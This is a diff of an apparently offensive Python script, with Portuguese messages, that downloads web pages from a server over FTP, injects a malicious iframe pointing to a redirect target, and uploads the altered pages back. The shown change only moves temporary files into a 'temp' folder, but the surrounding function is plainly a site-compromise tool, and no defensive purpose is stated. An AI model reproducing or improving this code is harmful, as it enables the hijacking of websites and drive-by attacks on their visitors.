@@ -48,13 +48,15 @@ def listFiles(ftp, path=''):
 def injectPage(ftp, filename, redirect):
     print(filename)
 
-    dir_path = os.path.dirname(filename)
+    if not os.path.exists("temp"):
+        os.makedirs("temp")
 
-    if dir_path != '':
-        if not os.path.exists(dir_path):
-            os.makedirs(dir_path)
+    dir_path = os.path.dirname("temp/" + filename)
 
-    f = open(filename + '.tmp', 'w')
+    if not os.path.exists(dir_path):
+        os.makedirs(dir_path)
+
+    f = open("temp/" + filename + '.tmp', 'w')
     ftp.retrlines('RETR ' + filename, f.write)
     print('[+] Página baixada: ' + filename)
 
@@ -62,7 +64,7 @@ def injectPage(ftp, filename, redirect):
     f.close()
     print('[+] Injetado IFrame malicioso em: ' + filename)
 
-    ftp.storbinary('STOR ' + filename, open(filename + '.tmp', 'rb'))
+    ftp.storbinary('STOR ' + filename, open("temp/" + filename + '.tmp', 'rb'))
     print('[+] Página injetada enviada: ' + filename)
 
 
